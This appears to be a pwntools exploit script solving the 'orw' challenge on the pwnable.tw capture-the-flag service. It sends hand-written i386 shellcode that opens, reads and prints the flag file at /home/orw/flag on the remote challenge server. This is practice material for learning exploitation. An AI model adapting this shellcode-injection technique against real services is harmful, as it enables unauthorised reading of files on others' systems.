from pwn import *
context(arch = "i386", os = "linux")
#p = process("./orw")
p = remote("chall.pwnable.tw", "10001")
ass = '''
		 xor eax, eax
		 push eax
		 push 0x6761
		 push 0x6c662f77
		 push 0x726f2f65
		 push 0x6d6f682f
		 mov al, 0x05
		 mov ebx, esp
		 xor ecx, ecx
		 int 0x80
		 sub esp, 0x40
		 mov ebx, eax
		 mov al, 0x03
		 mov ecx, esp
		 mov dl, 0x40
		 int 0x80
		 mov al, 0x04
		 mov bl, 0x01
		 mov ecx, esp
		 mov dl, 0x40
		 int 0x80
	  '''
shellcode = asm(ass)
p.recvuntil(":")
p.send(shellcode)
s = p.recv(0x40)
print s